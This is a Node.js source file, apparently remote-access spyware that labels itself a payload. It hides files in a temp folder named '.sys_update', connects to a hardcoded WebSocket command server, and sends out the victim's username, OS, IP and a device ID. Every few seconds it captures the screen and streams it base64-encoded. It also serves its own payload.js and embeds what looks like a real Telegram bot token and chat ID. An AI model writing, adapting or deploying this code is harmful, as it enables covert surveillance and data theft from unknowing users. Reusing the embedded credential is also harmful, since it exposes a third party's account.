const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const http = require('http');
const crypto = require('crypto');

// --- LOGGING SYSTEM ---
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
 const timestamp = new Date().toISOString();
 const line = `[${timestamp}] ${msg}`;
 console.log(line); // This shows up in Vercel logs
 try {
 fs.appendFileSync(LOG_FILE, `${line}\n`);
 } catch (e) {}
}

log("[INIT] Payload starting...");

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app';
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let isConnected = false;

// Persistence Logic
const persistDir = path.join(os.tmpdir(), '.sys_update');
if (!fs.existsSync(persistDir)) {
 fs.mkdirSync(persistDir);
}

function initConnection() {
 log(`[WS] Attempting connection to ${WS_URL}...`);
 
 ws = new WebSocket(WS_URL);

 ws.on('open', () => {
 reconnectAttempts = 0;
 isConnected = true;
 
 // Generate stable ID
 if (!myId) {
 const mac = getMacAddress();
 myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
 }
 
 log(`[WS] Connected with ID: ${myId}`);

 // Send Info Packet immediately
 safeSend(JSON.stringify({
 type: 'info',
 id: myId,
 os: os.platform(),
 arch: os.arch(),
 user: os.userInfo().username,
 ip: getExternalIP(),
 version: '1.0.0'
 }));

 startMonitoring();
 });

 ws.on('message', (msg) => {
 try {
 const data = JSON.parse(msg);
 if (data.type === 'take_control') takeControl(true);
 else if (data.type === 'release_control') takeControl(false);
 else if (['offer', 'answer', 'candidate'].includes(data.type)) {
 handleSignaling(data);
 }
 } catch (e) {
 log(`[WS] Error parsing message: ${e.message}`);
 }
 });

 ws.on('close', (code, reason) => {
 log(`[WS] Closed. Code: ${code}, Reason: ${reason.toString()}`);
 isConnected = false;
 reconnect();
 });

 ws.on('error', (err) => {
 log(`[WS] Error: ${err.message}`);
 });
}

function reconnect() {
 if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
 reconnectAttempts++;
 const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
 log(`[WS] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
 setTimeout(initConnection, delay);
 } else {
 log("[WS] Max reconnection attempts reached.");
 keepAlive();
 }
}

function safeSend(data) {
 if (!ws) return false;
 if (ws.readyState !== WebSocket.OPEN) return false;

 try {
 ws.send(typeof data === "string" ? data : JSON.stringify(data));
 return true;
 } catch (error) {
 log(`[WS] Send failed: ${error.message}`);
 return false;
 }
}

function startMonitoring() {
 // Heartbeat
 setInterval(() => {
 if (isConnected && ws.readyState === WebSocket.OPEN) {
 safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
 }
 }, 30000);

 // Screen Capture - NO FILTERS
 setInterval(() => {
 if (isConnected) captureScreen();
 }, 5000);
}

function captureScreen() {
 if (!ws || ws.readyState !== WebSocket.OPEN) return;

 const imgPath = path.join(os.tmpdir(), 'screen.png');

 // Simplified capture using standard ffmpeg
 exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
 if (err && !fs.existsSync(imgPath)) {
 log("[CAPTURE] Standard ffmpeg failed, trying macOS/Alt method...");
 exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
 if (!err2 && fs.existsSync(imgPath)) {
 const img = fs.readFileSync(imgPath);
 safeSend({
 type: 'screen_data',
 id: myId,
 data: img.toString('base64')
 });
 log("[CAPTURE] Success via Alt method");
 } else {
 log(`[CAPTURE] Failed: ${err2 ? err2.message : 'File missing'}`);
 }
 });
 } else if (!err && fs.existsSync(imgPath)) {
 const img = fs.readFileSync(imgPath);
 safeSend(JSON.stringify({
 type: 'screen_data',
 id: myId,
 data: img.toString('base64')
 }));
 log("[CAPTURE] Success via Standard method");
 } else {
 log("[CAPTURE] No image file found after execution");
 }
 });
}

function getExternalIP() {
 const nets = os.networkInterfaces();
 for (const name of Object.keys(nets)) {
 for (const net of nets[name]) {
 if (net.family === 'IPv4' && !net.internal) {
 return net.address;
 }
 }
 }
 return 'unknown';
}

function getMacAddress() {
 const nets = os.networkInterfaces();
 for (const name of Object.keys(nets)) {
 for (const net of nets[name]) {
 if (net.mac !== '00:00:00:00:00:00') {
 return net.mac;
 }
 }
 }
 return 'default-mac';
}

function takeControl(state) {
 log(`[CTRL] Take Control: ${state}`);
}

function handleSignaling(data) {
 log(`[SIG] Received signaling data: ${JSON.stringify(data)}`);
}

function keepAlive() {
 setInterval(() => {}, 60000);
}

// --- HTTP SERVER SETUP ---
const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
 if (req.url === '/payload.js') {
 res.writeHead(200, { 'Content-Type': 'application/javascript' });
 res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
 } 
 else if (req.url === '/' || req.url === '/index.html') {
 const indexPath = path.join(__dirname, 'index.html');
 if (fs.existsSync(indexPath)) {
 res.writeHead(200, { 'Content-Type': 'text/html' });
 res.end(fs.readFileSync(indexPath));
 } else {
 res.writeHead(404);
 res.end('index.html not found');
 }
 } 
 else if (req.url === '/health') {
 res.writeHead(200, { 'Content-Type': 'text/plain' });
 res.end('OK');
 } 
 else {
 res.writeHead(200, { 'Content-Type': 'application/json' });
 res.end(JSON.stringify({ 
 status: 'running', 
 id: myId || 'pending_connection',
 timestamp: new Date().toISOString()
 }));
 }
});

server.listen(PORT, () => {
 log(`[HTTP] Server listening on port ${PORT}`);
 initConnection();
});

setInterval(() => {}, 60000);

exports.handler = async (event, context) => {
 return {
 statusCode: 200,
 body: JSON.stringify({ status: 'running', id: myId })
 };
};
